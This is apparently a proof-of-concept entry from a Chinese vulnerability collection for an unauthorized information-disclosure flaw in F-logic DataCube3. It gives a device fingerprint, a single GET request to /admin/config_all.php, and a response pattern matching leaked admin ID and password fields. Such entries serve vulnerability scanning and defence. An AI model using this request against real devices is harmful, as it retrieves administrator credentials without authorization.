# F-logicDataCube3未授权信息泄露漏洞

F-logicDataCube3 ｜ 未授权访问 ｜ —
- **指纹**：`title=="DataCube3"`
- **请求**：`GET /admin/config_all.php HTTP/1.1`
- **响应特征**：302 ^(?=.*?login.admin_id)(?=.*?login.admin_pwd).*?$